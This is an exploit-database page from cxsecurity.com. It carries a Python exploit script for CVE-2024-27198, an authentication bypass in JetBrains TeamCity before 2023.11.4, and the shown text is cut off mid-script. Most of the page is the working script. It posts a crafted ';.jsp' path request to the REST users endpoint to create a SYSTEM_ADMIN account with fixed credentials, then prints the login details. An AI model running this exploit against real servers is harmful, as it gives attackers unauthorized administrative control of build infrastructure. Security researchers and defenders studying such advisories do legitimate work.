---
title: JetBrains TeamCity 2023.11.4 Authentication Bypass
url: https://cxsecurity.com/issue/WLB-2025080010
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-08-12
fetch_date: 2025-10-07T00:12:43.747605
---

# JetBrains TeamCity 2023.11.4 Authentication Bypass

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **JetBrains TeamCity 2023.11.4 Authentication Bypass** **2025.08.11**  Credit:  **[ibrahimsql (https://github.com/ibrahimsql)](https://cxsecurity.com/author/ibrahimsql%2B%28https%3A//github.com/ibrahimsql%29/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-27198](https://cxsecurity.com/cveshow/CVE-2024-27198/ "Click to see CVE-2024-27198")**  CWE: **N/A** | |

#!/usr/bin/env python3
# -\*- coding: utf-8 -\*-
"""
# Exploit Title: JetBrains TeamCity 2023.11.4 - Authentication Bypass
# Date: 2024-02-21
# Exploit Author: ibrahimsql (https://github.com/ibrahimsql)
# Vendor Homepage: https://www.jetbrains.com/teamcity/
# Version: < 2023.11.4
# CVE: CVE-2024-27198
# CVSS Score: 9.8 (Critical)
# Description:
# JetBrains TeamCity before version 2023.11.4 contains a critical authentication bypass
# vulnerability that allows unauthenticated attackers to perform administrative actions.
# The vulnerability leverages a path traversal-like technique in the JSP handling
# mechanism combined with REST API endpoints to bypass authentication.
# Requirements: requests>=2.25.1
"""
import requests
import argparse
import sys
import json
from urllib.parse import urlparse
requests.packages.urllib3.disable\_warnings()
class Colors:
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
BOLD = '\033[1m'
END = '\033[0m'
banner = f"""{Colors.CYAN}
████████╗███████╗ █████╗ ███╗ ███╗ ██████╗██╗████████╗██╗ ██╗
╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██╔════╝██║╚══██╔══╝╚██╗ ██╔╝
██║ █████╗ ███████║██╔████╔██║██║ ██║ ██║ ╚████╔╝
██║ ██╔══╝ ██╔══██║██║╚██╔╝██║██║ ██║ ██║ ╚██╔╝
██║ ███████╗██║ ██║██║ ╚═╝ ██║╚██████╗██║ ██║ ██║
╚═╝ ╚══════╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═════╝╚═╝ ╚═╝ ╚═╝
{Colors.END}
{Colors.BOLD}{Colors.RED} TeamCity Authentication Bypass (CVE-2024-27198){Colors.END}
{Colors.YELLOW} Author: ibrahimsql{Colors.END}
"""
parser = argparse.ArgumentParser(description="TeamCity Authentication Bypass Exploit (CVE-2024-27198)")
parser.add\_argument("--url", type=str, required=True, help="Target TeamCity URL")
parser.add\_argument("--timeout", type=int, default=15, help="Request timeout (default: 15)")
parser.add\_argument("--verbose", "-v", action="store\_true", help="Enable verbose output")
args = parser.parse\_args()
class TeamCityExploit:
def \_\_init\_\_(self, target\_url, timeout=15, verbose=False):
self.target\_url = target\_url.rstrip('/')
self.timeout = timeout
self.verbose = verbose
self.session = requests.Session()
def \_log(self, message, level="info"):
if level == "success":
print(f"{Colors.GREEN}[+] {message}{Colors.END}")
elif level == "error":
print(f"{Colors.RED}[-] {message}{Colors.END}")
elif level == "warning":
print(f"{Colors.YELLOW}[!] {message}{Colors.END}")
elif level == "info":
print(f"{Colors.BLUE}[\*] {message}{Colors.END}")
elif level == "verbose" and self.verbose:
print(f"[DEBUG] {message}")
def check\_target\_reachability(self):
try:
self.\_log(f"Checking target: {self.target\_url}")
response = self.session.get(self.target\_url, verify=False, timeout=self.timeout)
if response.status\_code in [200, 302, 401, 403]:
self.\_log("Target is reachable", "success")
return True
else:
self.\_log(f"Unexpected status: {response.status\_code}", "error")
return False
except requests.exceptions.Timeout:
self.\_log("Connection timeout", "error")
return False
except requests.exceptions.ConnectionError:
self.\_log("Connection error", "error")
return False
except Exception as e:
self.\_log(f"Error: {str(e)}", "error")
return False
def exploit\_authentication\_bypass(self):
exploit\_path = "/idontexist?jsp=/app/rest/users;.jsp"
full\_url = f"{self.target\_url}{exploit\_path}"
self.\_log(f"Targeting: {full\_url}")
headers = {
"Content-Type": "application/json",
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
"Accept": "application/json, text/plain, \*/\*"
}
payload = {
"username": "ibrahimsql",
"password": "ibrahimsql",
"email": "ibrahimsql@exploit.local",
"roles": {
"role": [{
"roleId": "SYSTEM\_ADMIN",
"scope": "g"
}]
}
}
self.\_log(f"Payload: {json.dumps(payload)}", "verbose")
try:
self.\_log("Attempting authentication bypass...")
response = self.session.post(full\_url, headers=headers, verify=False, json=payload, timeout=self.timeout)
self.\_log(f"Status: {response.status\_code}", "verbose")
self.\_log(f"Response: {response.text[:200]}", "verbose")
if response.status\_code == 200:
self.\_log("Exploit successful!", "success")
print(f"\n{Colors.BOLD}{Colors.GREEN}[SUCCESS] Admin user created!{Colors.END}")
print(f"{Colors.CYAN}{'='\*50}{Colors.END}")
print(f"{Colors.YELLOW}Username:{Colors.END} ibrahimsql")
print(f"{Colors.YELLOW}Password:{Colors.END} ibrahimsql")
print(f"{Colors.YELLOW}Login URL:{Colors.END} {self.target\_url}/login.html")
print(f"{Colors.CYAN}{'='\*50}{Colors.END}")
return True
elif response.status\_code == 401:
self.\_log("Authentication required - target may be patched", "error")
return False
elif response.status\_code == 404:
self.\_log("Endpoint not found - target may be patched", "error")
return False
elif response.status\_code == 403:
self.\_log("Access forbidden", "error")
return False
else:
self.\_log(f"Unexpected status: {response.status\_code}", "error")
return False
except requests.exceptions.Timeout:
self.\_log("Request timeout", "error")
return False
except requests.exceptions.ConnectionError:
self.\_log("Connection error", "error")
return False
except Exception as e:
self.\_log(f"Error: {str(e)}", "error")
return False
def validate\_url(url):
try:
parsed = urlparse(url)
if not parsed.scheme:
url = f"http://{url}"
parsed = urlparse(url)
if parsed.scheme not in ['http', 'https']:
raise ValueError("URL must use HTTP or HTTPS")
if not parsed.netloc:
raise ValueError("Invalid URL format")
return url
except Exception as e:
raise ValueError(f"Invalid URL: {str(e)}")
def main():
print(banner)
try:
target\_url = validate\_url(args.url)
print(f"{Colors.BOLD}{Colors.CYAN}=== CVE-2024-27198 TeamCity Exploit ==={Colors.END}")
print(f"{Colors.YELLOW}Author:{Colors.END} ibrahimsql")
print(f"{Colors.YELLOW}T...